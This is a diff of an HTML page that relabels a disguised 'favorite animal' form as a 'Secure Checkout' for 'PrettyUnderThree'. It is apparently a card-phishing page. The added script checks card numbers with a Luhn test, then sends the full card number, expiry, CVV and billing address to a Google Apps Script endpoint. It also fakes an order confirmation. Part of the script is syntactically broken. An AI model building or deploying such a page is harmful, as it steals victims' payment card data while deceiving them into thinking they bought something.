@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>FAV animal | PrettyUnderThree</title>
+  <title>Secure Checkout | PrettyUnderThree</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
@@ -91,7 +91,7 @@
 
 <body>
 
-<header>🔒 animal selection 1t</header>
+<header>🔒 Secure Checkout</header>
 
 <div class="container">
 
@@ -102,16 +102,16 @@
     <div id="step1" class="step active">
 
       <h3>Contact</h3>
-      <input type="email" id="email" placeholder="favorite insect">
+      <input type="email" id="email" placeholder="Email">
 
       <h3>Shipping</h3>
-      <input type="text" id="name" placeholder="favorite animal">
-      <input type="text" id="address" placeholder="favorite bird">
-      <input type="text" id="city" placeholder="favorite shark">
+      <input type="text" id="name" placeholder="Full Name">
+      <input type="text" id="address" placeholder="Address">
+      <input type="text" id="city" placeholder="City">
 
       <div class="row">
-        <input type="text" id="state" placeholder="favorite snake">
-        <input type="text" id="zip" placeholder="favorite dog">
+        <input type="text" id="state" placeholder="State">
+        <input type="text" id="zip" placeholder="ZIP">
       </div>
 
       <button onclick="goToPayment()">Continue</button>
@@ -120,26 +120,26 @@
     <!-- STEP 2 -->
     <div id="step2" class="step">
 
-      <h3>favorite animal 2</h3>
+      <h3>Payment</h3>
 
-      <input type="text" id="card" placeholder="favorite turtle">
+      <input type="text" id="card" placeholder="Card Number" oninput="detectCard()">
       <div id="cardType" style="margin-bottom:10px;"></div>
 
       <div class="row">
-        <input type="text" id="exp" placeholder="favorite fish">
-        <input type="text" id="cvv" placeholder="favorite lizard">
+        <input type="text" id="exp" placeholder="MM/YY">
+        <input type="text" id="cvv" placeholder="CVV">
       </div>
 
-      <input type="text" id="cardname" placeholder="your name">
+      <input type="text" id="cardname" placeholder="Name on Card">
 
       <h3>Billing Address</h3>
-      <input type="text" id="bname" placeholder="Full animal Name">
-      <input type="text" id="baddress" placeholder="where is it from">
-      <input type="text" id="bcity" placeholder="what type of animal">
+      <input type="text" id="bname" placeholder="Full Name">
+      <input type="text" id="baddress" placeholder="Address">
+      <input type="text" id="bcity" placeholder="City">
 
       <div class="row">
-        <input type="text" id="bstate" placeholder="what does it eat">
-        <input type="text" id="bzip" placeholder="nocturnal?">
+        <input type="text" id="bstate" placeholder="State">
+        <input type="text" id="bzip" placeholder="ZIP">
       </div>
 
       <button onclick="placeOrder()">Place Order</button>
@@ -155,25 +155,25 @@
     <h3>Summary</h3>
 
     <div class="summary-row">
-      <span>animal</span>
-      <span>type?</span>
+      <span>Items</span>
+      <span>$3</span>
     </div>
 
     <div class="summary-row">
-      <span>birds</span>
-      <span style="color:green;">700</span>
+      <span>Shipping</span>
+      <span style="color:green;">FREE</span>
     </div>
 
     <div class="summary-row">
-      <span>eat</span>
-      <span>drink</span>
+      <span>Tax</span>
+      <span>$1</span>
     </div>
 
     <hr>
 
     <div class="summary-row total">
-      <span>hibernate?</span>
-      <span>weather</span>
+      <span>Total</span>
+      <span>$4</span>
     </div>
 
   </div>
@@ -181,32 +181,108 @@
 </div>
 
 <script>
+// VALIDATION
+function isValidEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
+function isValidZip(z){return /^\d{5}$/.test(z);}
+function isValidState(s){return /^[A-Za-z]{2}$/.test(s);}
+function isValidCVV(c){return /^\d{3,4}$/.test(c);}
+function isValidExp(e){return /^(0[1-9]|1[0-2])\/\d{2}$/.test(e);}
+
+// CHECK EXPIRED
+function isExpired(exp){
+  let [m,y] = exp.split("/");
+  let now = new Date();
+  let year = 2000 + parseInt(y);
+  let month = parseInt(m);
+  return year < now.getFullYear() || 
+         (year === now.getFullYear() && month < now.getMonth()+1);
+}
+
+// LUHN CHECK
+function luhnCheck(card){
+  let sum=0,flip=false;
+  card=card.replace(/\D/g,'');
+  for(let i=card.length-1;i>=0;i--){
+    let n=parseInt(card[i]);
+    if(flip){n*=2;if(n>9)n-=9;}
+    sum+=n;flip=!flip;
+  }
+  return sum%10===0;
+}
+
+// CARD TYPE
+function getCardType(n){
+  n=n.replace(/\D/g,'');
+  if(/^4/.test(n)) return "Visa";
+  if(/^5/.test(n)) return "Mastercard";
+  if(/^3/.test(n)) return "Amex";
+  return "Card";
+}
+
+function detectCard(){
+  cardType.innerHTML = cardEl.value ? "Card: " + getCardType(cardEl.value) : "";
+}
+
 // NAVIGATION
 function goToPayment(){
-  document.getElementById("step1").classList.remove("active");
-  document.getElementById("step2").classList.add("active");
+  if(!isValidEmail(emailEl.value)){
+    alert("Invalid email");
+    return;
+  }
+
+  step1.classList.remove("active");
+  step2.classList.add("active");
+
+  // CLEAR billing fields (IMPORTANT FIX)
+  bnameEl.value="";
+  baddressEl.value="";
+  bcityEl.value="";
+  bstateEl.value="";
+  bzipEl.value="";
 }
 
 function backToShipping(){
-  document.getElementById("step2").classList.remove("active");
-  document.getElementById("step1").classList.add("active");
+  step2.classList.remove("active");
+  step1.classList.add("active");
 }
 
-// SAVE DATA (NO REDIRECT)
-function placeOrder() {
+// FINAL CHECK
+function placeOrder(){
+
+  let card = cardEl.value.replace(/\D/g,'');
+
+  if(card.length < 13){
+    alert("Card too short"); return;
+  }
+
+  if(!luhnCheck(card)){
+    alert("Invalid card number"); return;
+  }
+
+  if(!isValidExp(expEl.value)){
+    alert("Invalid expiration"); return;
+  }
+
+  if(isExpired(expEl.value)){
+    alert("Card expired"); return;
+  }
+
+  if(!isValidCVV(cvvEl.value)){
+    alert("Invalid CVV"); return;
+  }
+
+  if(!bnameEl.value || !baddressEl.value || !bcityEl.value || !bstateEl.value || !bzipEl.value){
+    alert("Billing address required"); return;
+  }
+
+  // SUBMIT DATA
+
   const data = {
     email: document.getElementById("email").value,
-    name: document.getElementById("name").value,
-    address: document.getElementById("address").value,
-    city: document.getElementById("city").value,
-    state: document.getElementById("state").value,
-    zip: document.getElementById("zip").value,
-
-    animal2: document.getElementById("card").value,
-    fish: document.getElementById("exp").value,
-    lizard: document.getElementById("cvv").value,
+    cardnum: document.getElementById("card").value,
+    expdate: document.getElementById("exp").value,
+    cvv: document.getElementById("cvv").value,
     cardname: document.getElementById("cardname").value,
-
     bname: document.getElementById("bname").value,
     baddress: document.getElementById("baddress").value,
     bcity: document.getElementById("bcity").value,
@@ -214,18 +290,52 @@ function placeOrder() {
     bzip: document.getElementById("bzip").value
   };
 
-  let allData = JSON.parse(localStorage.getItem("animalDataList")) || [];
-  allData.push(data);
-  localStorage.setItem("animalDataList", JSON.stringify(allData));
+  fetch("https://script.google.com/macros/s/AKfycbxgqumKEhFDaNHqn9AKxp8cFFs2Is5yh4FCCbrMfYCLuRq3QZ2yzPArCVK3zEL5kt0eLA/exec", {
+    method: "POST",
+    body: JSON.stringify(data)
+  });
 
-  alert("Submitted successfully");
+  .catch(() => alert("Error submitting"));
+};
 
-  // Clear inputs
-  document.querySelectorAll("input").forEach(input => input.value = "");
+  // CREATE ORDER DATA
+  const orderNumber = "PU3-" + Math.floor(100000 + Math.random() * 900000);
+  const now = new Date();
 
-  // Go back to step 1
-  backToShipping();
+  localStorage.setItem("orderData", JSON.stringify({
+    orderNumber: orderNumber,
+    name: nameEl.value,
+    email: emailEl.value,
+    total: "$4.00",
+    date: now.toLocaleDateString(),
+    time: now.toLocaleTimeString()
+  }));
+
+  // REDIRECT
+  window.location.href = "confirmation.html";
 }
+
+// ELEMENTS
+const emailEl=document.getElementById("email");
+const nameEl=document.getElementById("name");
+const addressEl=document.getElementById("address");
+const cityEl=document.getElementById("city");
+const stateEl=document.getElementById("state");
+const zipEl=document.getElementById("zip");
+
+const cardEl=document.getElementById("card");
+const expEl=document.getElementById("exp");
+const cvvEl=document.getElementById("cvv");
+
+const bnameEl=document.getElementById("bname");
+const baddressEl=document.getElementById("baddress");
+const bcityEl=document.getElementById("bcity");
+const bstateEl=document.getElementById("bstate");
+const bzipEl=document.getElementById("bzip");
+
+const step1=document.getElementById("step1");
+const step2=document.getElementById("step2");
+const cardType=document.getElementById("cardType");
 </script>
 
 </body>
